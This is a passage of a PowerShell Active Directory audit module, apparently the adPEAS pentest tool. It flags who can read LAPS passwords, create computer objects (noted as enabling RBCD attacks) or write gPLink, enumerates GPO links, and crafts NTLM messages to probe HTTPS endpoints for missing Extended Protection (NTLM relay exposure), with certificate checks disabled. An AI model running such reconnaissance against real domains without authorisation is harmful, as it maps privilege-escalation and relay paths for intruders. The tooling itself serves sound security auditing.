	                        $Findings += [PSCustomObject]@{
	                            CheckType     = "LAPS"
	                            Right         = "ReadProperty (msLAPS-EncryptedPassword - Windows LAPS)"
	                            Principal     = $TrusteeName
	                            SID           = $TrusteeSID
	                            Severity      = $Severity
	                            InheritedFrom = $InheritedFrom
	                        }
	                        $lapsPropertyFound = $true
	                    }
	                    $encHistMatch = ($ACE.ObjectType -and $ACE.ObjectType.Guid -eq $PropertyGUIDs['msLAPS-EncryptedPasswordHistory'].Guid)
	                    if ($encHistMatch) {
	                        $Severity = if ($IsPrivileged) { "Info" } else { "Medium" }
	                        $Findings += [PSCustomObject]@{
	                            CheckType     = "LAPS"
	                            Right         = "ReadProperty (msLAPS-EncryptedPasswordHistory - Windows LAPS)"
	                            Principal     = $TrusteeName
	                            SID           = $TrusteeSID
	                            Severity      = $Severity
	                            InheritedFrom = $InheritedFrom
	                        }
	                        $lapsPropertyFound = $true
	                    }
	                    $plainPwdMatch = ($ACE.ObjectType -and $ACE.ObjectType.Guid -eq $PropertyGUIDs['msLAPS-Password'].Guid)
	                    if ($plainPwdMatch) {
	                        $Severity = if ($IsPrivileged) { "Info" } else { "Medium" }
	                        $Findings += [PSCustomObject]@{
	                            CheckType     = "LAPS"
	                            Right         = "ReadProperty (msLAPS-Password - Windows LAPS)"
	                            Principal     = $TrusteeName
	                            SID           = $TrusteeSID
	                            Severity      = $Severity
	                            InheritedFrom = $InheritedFrom
	                        }
	                        $lapsPropertyFound = $true
	                    }
	                    $versionMatch = ($ACE.ObjectType -and $ACE.ObjectType.Guid -eq $PropertyGUIDs['msLAPS-CurrentPasswordVersion'].Guid)
	                    if ($versionMatch) {
	                        $Severity = if ($IsPrivileged) { "Info" } else { "Low" }
	                        $Findings += [PSCustomObject]@{
	                            CheckType     = "LAPS"
	                            Right         = "ReadProperty (msLAPS-CurrentPasswordVersion - Windows LAPS)"
	                            Principal     = $TrusteeName
	                            SID           = $TrusteeSID
	                            Severity      = $Severity
	                            InheritedFrom = $InheritedFrom
	                        }
	                        $lapsPropertyFound = $true
	                    }
	                    $expTimeMatch = ($ACE.ObjectType -and $ACE.ObjectType.Guid -eq $PropertyGUIDs['msLAPS-PasswordExpirationTime'].Guid)
	                    if ($expTimeMatch) {
	                        $Severity = if ($IsPrivileged) { "Info" } else { "Low" }
	                        $Findings += [PSCustomObject]@{
	                            CheckType     = "LAPS"
	                            Right         = "ReadProperty (msLAPS-PasswordExpirationTime - Windows LAPS)"
	                            Principal     = $TrusteeName
	                            SID           = $TrusteeSID
	                            Severity      = $Severity
	                            InheritedFrom = $InheritedFrom
	                        }
	                        $lapsPropertyFound = $true
	                    }
	                    if ($lapsIsAllProperties -and -not $lapsPropertyFound -and -not $skipAllPropertiesOnly) {
	                        $Severity = if ($IsPrivileged) { "Info" } else { "Medium" }
	                        $Findings += [PSCustomObject]@{
	                            CheckType     = "LAPS"
	                            Right         = "ReadProperty (All Properties - includes LAPS)"
	                            Principal     = $TrusteeName
	                            SID           = $TrusteeSID
	                            Severity      = $Severity
	                            InheritedFrom = $InheritedFrom
	                        }
	                    }
	                }
	            }
	            if ($CheckType -contains 'ObjectCreation') {
	                $HasCreateChild = $ACE.ActiveDirectoryRights -band [System.DirectoryServices.ActiveDirectoryRights]::CreateChild
	                if ($HasCreateChild) {
	                    $createTarget = if ($IsAllProperties) {
	                        "All Objects"
	                    } else {
	                        $className = Get-SchemaClassName -GUID $objectType
	                        if ($className) {
	                            (Get-Culture).TextInfo.ToTitleCase($className)
	                        } else {
	                            $objectType.ToString()
	                        }
	                    }
	                    $Severity = if ($IsPrivileged) {
	                        "Info"
	                    } elseif ($objectType -eq $SchemaClassGUIDs['computer'] -or $IsAllProperties) {
	                        "High"  # Computer creation enables RBCD attacks
	                    } else {
	                        "Medium"
	                    }
	                    $Findings += [PSCustomObject]@{
	                        CheckType     = "ObjectCreation"
	                        Right         = "CreateChild ($createTarget)"
	                        Principal     = $TrusteeName
	                        SID           = $TrusteeSID
	                        Severity      = $Severity
	                        InheritedFrom = $InheritedFrom
	                    }
	                }
	            }
	            if ($CheckType -contains 'GPOLinking') {
	                $AppliesToOU = $IsAllObjectTypes -or ($inheritedObjectType -eq $SchemaClassGUIDs['organizationalUnit'])
	                if ($HasWriteProperty -and -not $IsAllProperties -and $AppliesToOU) {
	                    if ($ACE.ObjectType -eq $PropertyGUIDs['gPLink']) {
	                        $Severity = if ($IsPrivileged) { "Info" } else { "Medium" }
	                        $Findings += [PSCustomObject]@{
	                            CheckType     = "GPOLinking"
	                            Right         = "WriteProperty (gPLink)"
	                            Principal     = $TrusteeName
	                            SID           = $TrusteeSID
	                            Severity      = $Severity
	                            InheritedFrom = $InheritedFrom
	                        }
	                    }
	                }
	            }
	        }
	        $result = [PSCustomObject]@{
	            OU       = $DistinguishedName
	            Findings = $Findings
	        }
	        if ($isFullScan) {
	            $Script:OUPermissionsCache[$cacheKey] = $result
	        }
	        return $result
	    } catch {
	        return $null
	    }
	}
	end {
	}
}
function Get-GPOLinkage {
	[CmdletBinding()]
	param()
	begin {
	}
	process {
	    if ($Script:CachedGPOLinkage) {
	        return $Script:CachedGPOLinkage
	    }
	    if (-not $Script:LdapConnection) {
	        Show-NoSessionError -Context "Get-GPOLinkage"
	        return $null
	    }
	    $domainDN = $Script:LDAPContext.DomainDN
	    $configDN = $Script:LDAPContext.ConfigurationDN
	    if (-not $domainDN) {
	        Write-Error "Domain DN not available in LDAPContext"
	        return $null
	    }
	    $gpoLinkage = @{}
	    try {
	        $results = Invoke-LDAPSearch -Filter "(gPLink=*)" -Properties "distinguishedName","gPLink","name","objectClass"
	        if (-not $results) {
	            return $gpoLinkage
	        }
	        foreach ($result in $results) {
	            $dn = $result.distinguishedName
	            $gPLink = $result.gPLink
	            $name = if ($result.name) { $result.name } else { $dn }
	            $objectClass = if ($result.objectClass) { if ($result.objectClass -is [array]) { $result.objectClass[-1] } else { $result.objectClass } } else { "Unknown" }
	            $guidPattern = '\{([0-9A-Fa-f\-]{36})\}'
	            $matches = [regex]::Matches($gPLink, $guidPattern)
	            $enabledGUIDs = [System.Collections.Generic.List[string]]::new()
	            foreach ($m in $matches) {
	                $g = "{$($m.Groups[1].Value.ToUpper())}"
	                $lp = '(?i)' + [regex]::Escape($g) + ';(\d+)'
	                $lo = if ($gPLink -match $lp) { [int]$Matches[1] } else { 0 }
	                if (($lo -band 1) -eq 0) { $enabledGUIDs.Add($g) }  # bit 0 = disabled
	            }
	            $linkOrderMap = @{}
	            $totalEnabled = $enabledGUIDs.Count
	            for ($idx = 0; $idx -lt $totalEnabled; $idx++) {
	                $linkOrderMap[$enabledGUIDs[$idx]] = $totalEnabled - $idx
	            }
	            foreach ($match in $matches) {
	                $gpoGUID = "{$($match.Groups[1].Value.ToUpper())}"
	                $linkPattern = '(?i)' + [regex]::Escape($gpoGUID) + ';(\d+)'
	                if ($gPLink -match $linkPattern) {
	                    $linkOptions = [int]$Matches[1]
	                }
	                else {
	                    $linkOptions = 0  # Default: Enabled
	                }
	                $isDisabled = ($linkOptions -band 1) -ne 0
	                $isEnforced = ($linkOptions -band 2) -ne 0
	                $linkStatus = if ($isDisabled) {
	                    "Disabled"
	                } elseif ($isEnforced) {
	                    "Enforced"
	                } else {
	                    "Enabled"
	                }
	                $scope = "OU"
	                if ($dn -eq $domainDN) {
	                    $scope = "Domain"
	                }
	                elseif ($dn -match "CN=Sites,CN=Configuration") {
	                    $scope = "Site"
	                }
	                $linkInfo = [PSCustomObject]@{
	                    DistinguishedName = $dn
	                    Name = $name
	                    Scope = $scope
	                    LinkStatus = $linkStatus
	                    IsEnforced = $isEnforced
	                    IsDisabled = $isDisabled
	                    ObjectClass = $objectClass
	                    LinkOrder = if ($linkOrderMap.ContainsKey($gpoGUID)) { $linkOrderMap[$gpoGUID] } else { $null }
	                }
	                if (-not $gpoLinkage.ContainsKey($gpoGUID)) {
	                    $gpoLinkage[$gpoGUID] = @()
	                }
	                $gpoLinkage[$gpoGUID] += $linkInfo
	            }
	        }
	        $Script:CachedGPOLinkage = $gpoLinkage
	    }
	    catch {
	        Write-Error "Error during GPO linkage enumeration: $_"
	    }
	    return $gpoLinkage
	}
	end {
	}
}
$Script:adPEASPublicKey = @"
<RSAKeyValue><Modulus></Modulus><Exponent>AQAB</Exponent></RSAKeyValue>
"@
function Test-adPEASLicense {
	[CmdletBinding()]
	param(
	    [Parameter(Mandatory=$true)]
	    [string]$LicenseJson
	)
	process {
	    try {
	        if ($LicenseJson -notmatch '^\s*\{' -and (Test-Path $LicenseJson -ErrorAction SilentlyContinue)) {
	            $LicenseJson = Get-Content $LicenseJson -Raw -Encoding UTF8
	        }
	        $license = $LicenseJson | ConvertFrom-Json
	        if (-not $license.Licensee -or -not $license.ValidUntil -or -not $license.Signature) {
	            return [PSCustomObject]@{
	                IsValid    = $false
	                Licensee   = $null
	                ValidUntil = $null
	                Expired    = $null
	                Message    = "Invalid license format"
	            }
	        }
	        if ($Script:adPEASPublicKey -match 'PLACEHOLDER') {
	            return [PSCustomObject]@{
	                IsValid    = $false
	                Licensee   = $null
	                ValidUntil = $null
	                Expired    = $null
	                Message    = "License validation not configured"
	            }
	        }
	        $rsa = $null
	        try {
	            $rsa = New-Object System.Security.Cryptography.RSACryptoServiceProvider
	            $rsa.FromXmlString($Script:adPEASPublicKey)
	            $payload = "$($license.Licensee)|$($license.ValidUntil)"
	            $payloadBytes = [System.Text.Encoding]::UTF8.GetBytes($payload)
	            $signatureBytes = [Convert]::FromBase64String($license.Signature)
	            $isValidSignature = $rsa.VerifyData($payloadBytes, "SHA256", $signatureBytes)
	            if (-not $isValidSignature) {
	                return [PSCustomObject]@{
	                    IsValid    = $false
	                    Licensee   = $null
	                    ValidUntil = $null
	                    Expired    = $null
	                    Message    = "Invalid license signature"
	                }
	            }
	        }
	        finally {
	            if ($rsa) { $rsa.Dispose() }
	        }
	        $validUntilDate = [datetime]::ParseExact(
	            $license.ValidUntil,
	            "yyyy-MM-dd",
	            [System.Globalization.CultureInfo]::InvariantCulture
	        )
	        $isExpired = (Get-Date).Date -gt $validUntilDate
	        $displayMessage = if ($isExpired) {
	            "License expired on $($license.ValidUntil) (Licensee: $($license.Licensee))"
	        }
	        else {
	            "Licensed to $($license.Licensee) - Valid until $($license.ValidUntil)"
	        }
	        return [PSCustomObject]@{
	            IsValid    = $true
	            Licensee   = $license.Licensee
	            ValidUntil = $license.ValidUntil
	            Expired    = $isExpired
	            Message    = $displayMessage
	        }
	    }
	    catch {
	        return [PSCustomObject]@{
	            IsValid    = $false
	            Licensee   = $null
	            ValidUntil = $null
	            Expired    = $null
	            Message    = "License validation error: $($_.Exception.Message)"
	        }
	    }
	}
}
$Script:NTLM_RNG = $null
function Get-NTLMSecureRNG {
	if ($null -eq $Script:NTLM_RNG) {
	    $Script:NTLM_RNG = [System.Security.Cryptography.RandomNumberGenerator]::Create()
	}
	return $Script:NTLM_RNG
}
$Script:NTLM_TYPE1 = 1
$Script:NTLM_TYPE2 = 2
$Script:NTLM_TYPE3 = 3
$Script:NTLMSSP_NEGOTIATE_UNICODE = [uint32]0x00000001
$Script:NTLMSSP_NEGOTIATE_OEM = [uint32]0x00000002
$Script:NTLMSSP_REQUEST_TARGET = [uint32]0x00000004
$Script:NTLMSSP_NEGOTIATE_SIGN = [uint32]0x00000010
$Script:NTLMSSP_NEGOTIATE_SEAL = [uint32]0x00000020
$Script:NTLMSSP_NEGOTIATE_DATAGRAM = [uint32]0x00000040
$Script:NTLMSSP_NEGOTIATE_LM_KEY = [uint32]0x00000080
$Script:NTLMSSP_NEGOTIATE_NTLM = [uint32]0x00000200
$Script:NTLMSSP_NEGOTIATE_OEM_DOMAIN_SUPPLIED = [uint32]0x00001000
$Script:NTLMSSP_NEGOTIATE_OEM_WORKSTATION_SUPPLIED = [uint32]0x00002000
$Script:NTLMSSP_NEGOTIATE_ALWAYS_SIGN = [uint32]0x00008000
$Script:NTLMSSP_TARGET_TYPE_DOMAIN = [uint32]0x00010000
$Script:NTLMSSP_TARGET_TYPE_SERVER = [uint32]0x00020000
$Script:NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY = [uint32]0x00080000
$Script:NTLMSSP_NEGOTIATE_TARGET_INFO = [uint32]0x00800000
$Script:NTLMSSP_NEGOTIATE_VERSION = [uint32]0x02000000
$Script:NTLMSSP_NEGOTIATE_128 = [uint32]0x20000000
$Script:NTLMSSP_NEGOTIATE_KEY_EXCH = [uint32]0x40000000
$Script:NTLMSSP_NEGOTIATE_56 = [uint32]2147483648  # 0x80000000 - must use decimal for high-bit
function New-NTLMType1Message {
	[CmdletBinding()]
	param()
	$signature = [System.Text.Encoding]::ASCII.GetBytes("NTLMSSP`0")
	$messageType = [BitConverter]::GetBytes([uint32]1)
	[uint32]$flags = $Script:NTLMSSP_NEGOTIATE_UNICODE -bor
	                 $Script:NTLMSSP_REQUEST_TARGET -bor
	                 $Script:NTLMSSP_NEGOTIATE_NTLM -bor
	                 $Script:NTLMSSP_NEGOTIATE_ALWAYS_SIGN -bor
	                 $Script:NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY -bor
	                 $Script:NTLMSSP_NEGOTIATE_128 -bor
	                 $Script:NTLMSSP_NEGOTIATE_56
	$flagsBytes = [BitConverter]::GetBytes($flags)
	$domainLen = [BitConverter]::GetBytes([uint16]0)
	$domainMaxLen = [BitConverter]::GetBytes([uint16]0)
	$domainOffset = [BitConverter]::GetBytes([uint32]0)
	$workstationLen = [BitConverter]::GetBytes([uint16]0)
	$workstationMaxLen = [BitConverter]::GetBytes([uint16]0)
	$workstationOffset = [BitConverter]::GetBytes([uint32]0)
	$message = New-Object System.Collections.Generic.List[byte]
	$message.AddRange($signature)           # 0-7:   "NTLMSSP\0"
	$message.AddRange($messageType)         # 8-11:  Type (1)
	$message.AddRange($flagsBytes)          # 12-15: Flags
	$message.AddRange($domainLen)           # 16-17: Domain length
	$message.AddRange($domainMaxLen)        # 18-19: Domain max length
	$message.AddRange($domainOffset)        # 20-23: Domain offset
	$message.AddRange($workstationLen)      # 24-25: Workstation length
	$message.AddRange($workstationMaxLen)   # 26-27: Workstation max length
	$message.AddRange($workstationOffset)   # 28-31: Workstation offset
	return [Convert]::ToBase64String($message.ToArray())
}
$Script:MsvAvEOL = 0x0000              # End of list
$Script:MsvAvNbComputerName = 0x0001   # NetBIOS computer name
$Script:MsvAvNbDomainName = 0x0002     # NetBIOS domain name
$Script:MsvAvDnsComputerName = 0x0003  # DNS computer name (FQDN)
$Script:MsvAvDnsDomainName = 0x0004    # DNS domain name
$Script:MsvAvDnsTreeName = 0x0005      # DNS forest name
$Script:MsvAvFlags = 0x0006            # Flags (bit 0x02 = EPA required)
$Script:MsvAvTimestamp = 0x0007        # FILETIME timestamp
$Script:MsvAvSingleHost = 0x0008       # Single host data
$Script:MsvAvTargetName = 0x0009       # SPN target name
$Script:MsvAvChannelBindings = 0x000A  # Channel bindings MD5 hash
function Read-NTLMType2Message {
	[CmdletBinding()]
	param(
	    [Parameter(Mandatory=$true)]
	    [string]$Type2Base64
	)
	try {
	    $bytes = [Convert]::FromBase64String($Type2Base64)
	    if ($bytes.Length -lt 32) {
	        throw "Type2 message too short (minimum 32 bytes, got $($bytes.Length))"
	    }
	    $signature = [System.Text.Encoding]::ASCII.GetString($bytes, 0, 8)
	    if ($signature -ne "NTLMSSP`0") {
	        throw "Invalid NTLM signature"
	    }
	    $messageType = [BitConverter]::ToUInt32($bytes, 8)
	    if ($messageType -ne 2) {
	        throw "Not a Type2 message (got type $messageType)"
	    }
	    $targetNameLen = [BitConverter]::ToUInt16($bytes, 12)
	    $targetNameOffset = [BitConverter]::ToInt32($bytes, 16)
	    $flags = [uint32]$bytes[20] + ([uint32]$bytes[21] -shl 8) + ([uint32]$bytes[22] -shl 16) + ([uint32]$bytes[23] -shl 24)
	    $challenge = $bytes[24..31]
	    $targetInfoLen = 0
	    $targetInfoOffset = 0
	    $targetInfo = $null
	    $avPairs = $null
	    if ($bytes.Length -ge 48) {
	        $targetInfoLen = [BitConverter]::ToUInt16($bytes, 40)
	        $targetInfoOffset = [BitConverter]::ToInt32($bytes, 44)
	        if ($targetInfoLen -gt 0 -and $targetInfoOffset -ge 0 -and ($targetInfoOffset + $targetInfoLen) -le $bytes.Length) {
	            $targetInfo = $bytes[$targetInfoOffset..($targetInfoOffset + $targetInfoLen - 1)]
	            $avPairs = Read-NTLMAvPairs -TargetInfoBytes $targetInfo
	        }
	    }
	    if ($null -eq $avPairs) {
	        $avPairs = [PSCustomObject]@{
	            NbComputerName = $null
	            NbDomainName = $null
	            DnsComputerName = $null
	            DnsDomainName = $null
	            DnsTreeName = $null
	            AvFlags = $null
	            EPARequired = $false
	            Timestamp = $null
	            TimestampUtc = $null
	            TargetSPN = $null
	        }
	    }
	    $targetName = ""
	    if ($targetNameLen -gt 0 -and $targetNameOffset -ge 0 -and ($targetNameOffset + $targetNameLen) -le $bytes.Length) {
	        if (($flags -band $Script:NTLMSSP_NEGOTIATE_UNICODE) -ne 0) {
	            $targetName = [System.Text.Encoding]::Unicode.GetString($bytes, $targetNameOffset, $targetNameLen)
	        } else {
	            $targetName = [System.Text.Encoding]::ASCII.GetString($bytes, $targetNameOffset, $targetNameLen)
	        }
	    }
	    return [PSCustomObject]@{
	        Success = $true
	        Challenge = $challenge
	        ChallengeHex = [BitConverter]::ToString($challenge) -replace '-', ''
	        TargetName = $targetName
	        TargetInfo = $targetInfo
	        Flags = $flags
	        NbComputerName = $avPairs.NbComputerName
	        NbDomainName = $avPairs.NbDomainName
	        DnsComputerName = $avPairs.DnsComputerName
	        DnsDomainName = $avPairs.DnsDomainName
	        DnsTreeName = $avPairs.DnsTreeName
	        Timestamp = $avPairs.Timestamp
	        TimestampUtc = $avPairs.TimestampUtc
	        AvFlags = $avPairs.AvFlags
	        EPARequired = $avPairs.EPARequired
	        TargetSPN = $avPairs.TargetSPN
	    }
	}
	catch {
	    return [PSCustomObject]@{
	        Success = $false
	        Error = $_.Exception.Message
	    }
	}
}
function Read-NTLMAvPairs {
	[CmdletBinding()]
	param(
	    [Parameter(Mandatory=$true)]
	    [byte[]]$TargetInfoBytes
	)
	$result = [PSCustomObject]@{
	    NbComputerName = $null    # NetBIOS computer name
	    NbDomainName = $null      # NetBIOS domain name
	    DnsComputerName = $null   # DNS computer name (FQDN)
	    DnsDomainName = $null     # DNS domain name
	    DnsTreeName = $null       # DNS forest name
	    AvFlags = $null           # Raw flags value
	    EPARequired = $false      # True if flag 0x02 is set
	    Timestamp = $null         # Raw FILETIME (Int64)
	    TimestampUtc = $null      # Parsed DateTime in UTC
	    TargetSPN = $null         # Target SPN (if present)
	    RawPairs = @{}            # All pairs for debugging
	}
	$offset = 0
	$length = $TargetInfoBytes.Length
	while ($offset + 4 -le $length) {
	    $avId = [BitConverter]::ToUInt16($TargetInfoBytes, $offset)
	    $avLen = [BitConverter]::ToUInt16($TargetInfoBytes, $offset + 2)
	    $offset += 4
	    if ($avId -eq $Script:MsvAvEOL) {
	        break
	    }
	    if ($offset + $avLen -gt $length) {
	        break
	    }
	    $valueBytes = $TargetInfoBytes[$offset..($offset + $avLen - 1)]
	    $offset += $avLen
	    switch ($avId) {
	        $Script:MsvAvNbComputerName {
	            $result.NbComputerName = [System.Text.Encoding]::Unicode.GetString($valueBytes)
	            $result.RawPairs['MsvAvNbComputerName'] = $result.NbComputerName
	        }
	        $Script:MsvAvNbDomainName {
	            $result.NbDomainName = [System.Text.Encoding]::Unicode.GetString($valueBytes)
	            $result.RawPairs['MsvAvNbDomainName'] = $result.NbDomainName
	        }
	        $Script:MsvAvDnsComputerName {
	            $result.DnsComputerName = [System.Text.Encoding]::Unicode.GetString($valueBytes)
	            $result.RawPairs['MsvAvDnsComputerName'] = $result.DnsComputerName
	        }
	        $Script:MsvAvDnsDomainName {
	            $result.DnsDomainName = [System.Text.Encoding]::Unicode.GetString($valueBytes)
	            $result.RawPairs['MsvAvDnsDomainName'] = $result.DnsDomainName
	        }
	        $Script:MsvAvDnsTreeName {
	            $result.DnsTreeName = [System.Text.Encoding]::Unicode.GetString($valueBytes)
	            $result.RawPairs['MsvAvDnsTreeName'] = $result.DnsTreeName
	        }
	        $Script:MsvAvFlags {
	            if ($avLen -ge 4) {
	                $result.AvFlags = [uint32]$valueBytes[0] + ([uint32]$valueBytes[1] -shl 8) + ([uint32]$valueBytes[2] -shl 16) + ([uint32]$valueBytes[3] -shl 24)
	                $result.EPARequired = ($result.AvFlags -band 0x02) -ne 0
	                $result.RawPairs['MsvAvFlags'] = "0x{0:X8}" -f $result.AvFlags
	            }
	        }
	        $Script:MsvAvTimestamp {
	            if ($avLen -ge 8) {
	                $result.Timestamp = [BitConverter]::ToInt64($valueBytes, 0)
	                try {
	                    $result.TimestampUtc = [DateTime]::FromFileTimeUtc($result.Timestamp)
	                    $result.RawPairs['MsvAvTimestamp'] = $result.TimestampUtc.ToString("yyyy-MM-dd HH:mm:ss UTC")
	                }
	                catch {
	                    $result.RawPairs['MsvAvTimestamp'] = "Invalid FILETIME: $($result.Timestamp)"
	                }
	            }
	        }
	        $Script:MsvAvTargetName {
	            $result.TargetSPN = [System.Text.Encoding]::Unicode.GetString($valueBytes)
	            $result.RawPairs['MsvAvTargetName'] = $result.TargetSPN
	        }
	        $Script:MsvAvChannelBindings {
	            $result.RawPairs['MsvAvChannelBindings'] = [BitConverter]::ToString($valueBytes) -replace '-', ''
	        }
	        $Script:MsvAvSingleHost {
	            $result.RawPairs['MsvAvSingleHost'] = [BitConverter]::ToString($valueBytes) -replace '-', ''
	        }
	        default {
	            $result.RawPairs["Unknown_0x{0:X4}" -f $avId] = [BitConverter]::ToString($valueBytes) -replace '-', ''
	        }
	    }
	}
	return $result
}
function New-RandomEPAIdentifier {
	[CmdletBinding()]
	param(
	    [Parameter(Mandatory=$false)]
	    [ValidateSet('Username', 'Workstation')]
	    [string]$Type = 'Username'
	)
	$rng = Get-NTLMSecureRNG
	if ($Type -eq 'Workstation') {
	    $prefixes = @('WS', 'PC', 'DT', 'NB', 'VM', 'SRV')
	}
	else {
	    $prefixes = @('admin', 'user', 'test', 'svc', 'app', 'sys', 'dev', 'ops')
	}
	$prefixBytes = New-Object byte[] 1
	$rng.GetBytes($prefixBytes)
	$prefix = $prefixes[$prefixBytes[0] % $prefixes.Count]
	$lengthBytes = New-Object byte[] 1
	$rng.GetBytes($lengthBytes)
	$suffixLength = 5 + ($lengthBytes[0] % 4)
	$chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
	if ($Type -eq 'Workstation') {
	    $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
	}
	$suffixBytes = New-Object byte[] $suffixLength
	$rng.GetBytes($suffixBytes)
	$suffix = -join ($suffixBytes | ForEach-Object { $chars[$_ % $chars.Length] })
	if ($Type -eq 'Workstation') {
	    return "$prefix-$suffix"
	}
	else {
	    return "$prefix.$suffix"
	}
}
function New-NTLMType3Message {
	[CmdletBinding()]
	param(
	    [Parameter(Mandatory=$true)]
	    $Type2Result,
	    [Parameter(Mandatory=$false)]
	    [string]$Username,
	    [Parameter(Mandatory=$false)]
	    [string]$Domain = "WORKGROUP"
	)
	if ($null -eq $Type2Result) {
	    return $null
	}
	if ($Type2Result.PSObject.Properties['Success'] -and -not $Type2Result.Success) {
	    return $null
	}
	if ($null -eq $Type2Result.Flags) {
	    return $null
	}
	if ([string]::IsNullOrEmpty($Username)) {
	    $Username = New-RandomEPAIdentifier -Type 'Username'
	}
	$workstationName = New-RandomEPAIdentifier -Type 'Workstation'
	$signature = [System.Text.Encoding]::ASCII.GetBytes("NTLMSSP`0")
	$messageType = [BitConverter]::GetBytes([uint32]3)
	$domainBytes = [System.Text.Encoding]::Unicode.GetBytes($Domain)
	$usernameBytes = [System.Text.Encoding]::Unicode.GetBytes($Username)
	$workstationBytes = [System.Text.Encoding]::Unicode.GetBytes($workstationName)
	$lmResponse = New-Object byte[] 24
	$ntResponse = New-Object byte[] 24
	$rng = Get-NTLMSecureRNG
	$rng.GetBytes($lmResponse)
	$rng.GetBytes($ntResponse)
	$headerSize = 72  # 64 + 8 for version
	$currentOffset = $headerSize
	$lmResponseOffset = $currentOffset
	$currentOffset += $lmResponse.Length
	$ntResponseOffset = $currentOffset
	$currentOffset += $ntResponse.Length
	$domainOffset = $currentOffset
	$currentOffset += $domainBytes.Length
	$usernameOffset = $currentOffset
	$currentOffset += $usernameBytes.Length
	$workstationOffset = $currentOffset
	$currentOffset += $workstationBytes.Length
	[uint32]$flags = [uint32]$Type2Result.Flags -bor $Script:NTLMSSP_NEGOTIATE_UNICODE -bor $Script:NTLMSSP_NEGOTIATE_VERSION
	$message = New-Object System.Collections.Generic.List[byte]
	$message.AddRange($signature)                                           # 0-7:   Signature
	$message.AddRange($messageType)                                         # 8-11:  Type (3)
	$message.AddRange([BitConverter]::GetBytes([uint16]$lmResponse.Length)) # 12-13: LM length
	$message.AddRange([BitConverter]::GetBytes([uint16]$lmResponse.Length)) # 14-15: LM max length
	$message.AddRange([BitConverter]::GetBytes([uint32]$lmResponseOffset))  # 16-19: LM offset
	$message.AddRange([BitConverter]::GetBytes([uint16]$ntResponse.Length)) # 20-21: NT length
	$message.AddRange([BitConverter]::GetBytes([uint16]$ntResponse.Length)) # 22-23: NT max length
	$message.AddRange([BitConverter]::GetBytes([uint32]$ntResponseOffset))  # 24-27: NT offset
	$message.AddRange([BitConverter]::GetBytes([uint16]$domainBytes.Length))  # 28-29: Domain length
	$message.AddRange([BitConverter]::GetBytes([uint16]$domainBytes.Length))  # 30-31: Domain max length
	$message.AddRange([BitConverter]::GetBytes([uint32]$domainOffset))        # 32-35: Domain offset
	$message.AddRange([BitConverter]::GetBytes([uint16]$usernameBytes.Length))  # 36-37: User length
	$message.AddRange([BitConverter]::GetBytes([uint16]$usernameBytes.Length))  # 38-39: User max length
	$message.AddRange([BitConverter]::GetBytes([uint32]$usernameOffset))        # 40-43: User offset
	$message.AddRange([BitConverter]::GetBytes([uint16]$workstationBytes.Length))  # 44-45: WS length
	$message.AddRange([BitConverter]::GetBytes([uint16]$workstationBytes.Length))  # 46-47: WS max length
	$message.AddRange([BitConverter]::GetBytes([uint32]$workstationOffset))        # 48-51: WS offset
	$message.AddRange([BitConverter]::GetBytes([uint16]0))                  # 52-53: Session key length
	$message.AddRange([BitConverter]::GetBytes([uint16]0))                  # 54-55: Session key max length
	$message.AddRange([BitConverter]::GetBytes([uint32]0))                  # 56-59: Session key offset
	$message.AddRange([BitConverter]::GetBytes([uint32]$flags))             # 60-63: Flags
	$version = [byte[]]@(0x0A, 0x00, 0x61, 0x4A, 0x00, 0x00, 0x00, 0x0F)
	$message.AddRange($version)                                             # 64-71: Version
	$message.AddRange($lmResponse)
	$message.AddRange($ntResponse)
	$message.AddRange($domainBytes)
	$message.AddRange($usernameBytes)
	$message.AddRange($workstationBytes)
	return [Convert]::ToBase64String($message.ToArray())
}
function Test-ExtendedProtection {
	[CmdletBinding()]
	param(
	    [Parameter(Mandatory=$true)]
	    [string]$Url,
	    [Parameter(Mandatory=$false)]
	    [int]$TimeoutSeconds = 10,
	    [Parameter(Mandatory=$false)]
	    [string]$UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
	)
	$result = [PSCustomObject]@{
	    Success = $false           # True if EPA test completed (not if EPA is enabled)
	    EPAEnabled = $null         # $true = EPA active (secure), $false = EPA not active (vulnerable), $null = unknown/N/A
	    Confidence = "Unknown"     # "High", "Medium", "Low", "Unknown", "N/A"
	    Type2Received = $false
	    Type3Response = $null
	    Type3StatusCode = $null
	    ErrorMessage = $null
	    DiagnosticInfo = $null
	    NbComputerName = $null     # NetBIOS computer name
	    NbDomainName = $null       # NetBIOS domain name
	    DnsComputerName = $null    # DNS computer name (FQDN)
	    DnsDomainName = $null      # DNS domain name
	    DnsTreeName = $null        # DNS forest name
	    ServerTimestamp = $null    # Server time (DateTime)
	    NTLMChallenge = $null      # NTLM challenge (hex)
	}
	$uri = $null
	try {
	    $uri = [System.Uri]$Url
	}
	catch {
	    $result.ErrorMessage = "Invalid URL syntax: $Url"
	    $result.DiagnosticInfo = $_.Exception.Message
	    return $result
	}
	if ($uri.Scheme -ne 'https') {
	    $result.Success = $true    # Test completed (we know the answer)
	    $result.EPAEnabled = $null # Not applicable (not "disabled")
	    $result.Confidence = "N/A"
	    $result.ErrorMessage = "EPA only applies to HTTPS connections. HTTP does not use Channel Binding."
	    $result.DiagnosticInfo = "HTTP has no TLS channel to bind to - NTLM relay is always possible over HTTP regardless of EPA settings"
	    return $result
	}
	$originalSecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol
	$originalCertCallback = [System.Net.ServicePointManager]::ServerCertificateValidationCallback
	$servicePoint = $null
	$originalConnectionLimit = $null
	try {
	    try {
	        $protocols = [System.Net.SecurityProtocolType]::Tls12
	        try { $protocols = $protocols -bor [System.Net.SecurityProtocolType]::Tls11 } catch { }
	        try { $protocols = $protocols -bor [System.Net.SecurityProtocolType]::Tls } catch { }
	        try {
	            $protocols = $protocols -bor [System.Net.SecurityProtocolType]::Tls13
	        }
	        catch {
	        }
	        [System.Net.ServicePointManager]::SecurityProtocol = $protocols
	    }
	    catch {
	    }
	    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
	    $servicePoint = [System.Net.ServicePointManager]::FindServicePoint($uri)
	    if ($servicePoint) {
	        $originalConnectionLimit = $servicePoint.ConnectionLimit
	        $servicePoint.ConnectionLimit = 1
	    }
	    $type1Message = New-NTLMType1Message
	    $type2Base64 = $null
	    $type2Result = $null
	    try {
